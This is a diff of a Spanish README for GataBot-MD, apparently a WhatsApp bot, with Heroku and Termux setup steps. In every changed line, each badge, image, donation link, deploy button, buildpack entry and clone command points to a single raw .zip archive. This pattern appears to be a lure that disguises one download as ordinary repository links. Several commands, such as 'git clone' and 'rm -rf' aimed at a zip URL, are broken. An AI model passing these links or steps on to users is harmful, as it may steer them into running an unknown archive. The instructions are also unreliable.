@@ -1,65 +1,65 @@
 > #### 🚀 Versión actual: 1.1.25
 
 <p align="center"> 
-  <a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"><img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip++%F0%9F%90%88;Gracias+por+visitar+este+repositorio.+%F0%9F%92%96" height="90px"
+  <a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"><img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip++%F0%9F%90%88;Gracias+por+visitar+este+repositorio.+%F0%9F%92%96" height="90px"
 </p>
 
 <p align="center">
-<img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" alt="GataBot-MD" width="900"/>
+<img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" alt="GataBot-MD" width="900"/>
 </p>
 
 <p align="center">
-<a href="#"><img title="GataBot-MD" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip TE AGRADA EL REPOSITORIO APOYAME CON UNA 🌟 ¡GRACIAS! -red?colorA=%255ff0000&colorB=%23017e40&style=for-the-badge"></a> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="28px">
+<a href="#"><img title="GataBot-MD" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip TE AGRADA EL REPOSITORIO APOYAME CON UNA 🌟 ¡GRACIAS! -red?colorA=%255ff0000&colorB=%23017e40&style=for-the-badge"></a> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="28px">
 </p>  
 
 <p align="center">
 </p>
-<a href="#"><img title="GataBot-MD" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip NECESARIO QUE LEA TODO EL README-red?colorA=%F77F48FF&colorB=%F77F48FF&style=for-the-badge"></a> 
-<a href="#"><img title="GataBot-MD" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip CON LA VERSIÓN MULTI DISPOSITIVOS DE WHATSAPP-red?colorA=%F77F48FF&colorB=%F77F48FF&style=for-the-badge">
+<a href="#"><img title="GataBot-MD" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip NECESARIO QUE LEA TODO EL README-red?colorA=%F77F48FF&colorB=%F77F48FF&style=for-the-badge"></a> 
+<a href="#"><img title="GataBot-MD" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip CON LA VERSIÓN MULTI DISPOSITIVOS DE WHATSAPP-red?colorA=%F77F48FF&colorB=%F77F48FF&style=for-the-badge">
 </a>
     
 <p align="higt">   
-<a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"><img title="Forks" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"></a>
-<a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"><img title="Watchers" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"></a>
-<a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"><img title="Stars" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"></a>
+<a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"><img title="Forks" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"></a>
+<a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"><img title="Watchers" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"></a>
+<a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"><img title="Stars" src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"></a>
 </p>
 
 -----
-[![blog](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip)
-](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip)  <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="29px">
+[![blog](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip)
+](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip)  <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="29px">
 
 <p align="hihg">   
-<a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" target="_blank"> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip%23E4405F?style=for-the-badge&logo=instagram&logoColor=white" target="_blank"></a> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="30px">
-<a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"><img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip+escr%C3%ADba+si+tiene+dudas." height="40px"
+<a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" target="_blank"> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip%23E4405F?style=for-the-badge&logo=instagram&logoColor=white" target="_blank"></a> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="30px">
+<a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"><img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip+escr%C3%ADba+si+tiene+dudas." height="40px"
 </p>
   
-[![blog](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip 
-)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip)  <a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="29px"></a>
+[![blog](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip 
+)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip)  <a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="29px"></a>
 
-[![blog](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip 
-)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip) <a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="29px"></a>
+[![blog](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip 
+)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip) <a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="29px"></a>
 
-[![blog](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip 
-)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip)  <a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip"> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="29px"></a>
+[![blog](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip 
+)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip)  <a href="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip"> <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="29px"></a>
 -----
-### 💖 ```DONAR``` [`Aquí`](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip)
+### 💖 ```DONAR``` [`Aquí`](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip)
 ### 🟣 ACTIVAR EN HEROKU 
 #### ☂️ PARA USUARIOS DE HEROKU 
 
-[![Deploy](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip) <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="32px">
-### Añada lo siguente al Buildpack: <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="32px">
+[![Deploy](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip) <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="32px">
+### Añada lo siguente al Buildpack: <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="32px">
 ```bash
 > heroku/nodejs
 ```
 ```bash
-> https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip
+> https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip
 ```
 ```bash
-> https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip
+> https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip
 ```
 -----
 
-### ACTIVAR EN TERMUX  <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="30px">
+### ACTIVAR EN TERMUX  <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="30px">
 ```bash
 ESCRIBE LOS SIGUIENTES COMANDOS UNO POR UNO:
 
@@ -71,7 +71,7 @@ ESCRIBE LOS SIGUIENTES COMANDOS UNO POR UNO:
 > pkg install ffmpeg -y
 > pkg install imagemagick -y
 > pkg install yarn
-> git clone https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip
+> git clone https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip
 > cd GataBot-MD
 > npm install
 > yarn install 
@@ -80,12 +80,12 @@ ESCRIBE LOS SIGUIENTES COMANDOS UNO POR UNO:
 > npm start
 ```
 ----    
-###  AJUSTE <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="32px">
-- CLONAR EL REPOSITORIO [`Aquí`](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip)
-- CAMBIAR NÚMERO DEL OWNER [`Aquí`](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip)
+###  AJUSTE <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="32px">
+- CLONAR EL REPOSITORIO [`Aquí`](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip)
+- CAMBIAR NÚMERO DEL OWNER [`Aquí`](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip)
 ----  
 
-### ACTIVAR EN CASO DE DETENERSE <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="30px">
+### ACTIVAR EN CASO DE DETENERSE <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="30px">
 ```bash
 ESCRIBE LOS SIGUIENTES COMANDOS UNO POR UNO:
 > cd 
@@ -94,12 +94,12 @@ ESCRIBE LOS SIGUIENTES COMANDOS UNO POR UNO:
 ```
 ----
 
-### OBTENER OTRO CODIGO QR <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip" height="30px">
+### OBTENER OTRO CODIGO QR <img src="https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip" height="30px">
 ```bash
 ESCRIBE LOS SIGUIENTES COMANDOS UNO POR UNO:
 > cd 
 > cd GataBot-MD
-> rm -rf https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip
+> rm -rf https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip
 > npm start
 ```
 ----
@@ -123,8 +123,8 @@ ESCRIBE LOS SIGUIENTES COMANDOS UNO POR UNO:
 
 ### 🌟 CREADORA 
  
-[![GataNina-Li](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip) 
+[![GataNina-Li](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip) 
  
 ### 🌟 AGRADECIMIENTOS
  
-[![TheShadowBrokers1](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/exocoelic/GataBot-MD.zip) 
+[![TheShadowBrokers1](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip)](https://raw.githubusercontent.com/Senku002/GataBot-MD/master/views/img/light/Gata_MD_Bot_protogenes.zip) 
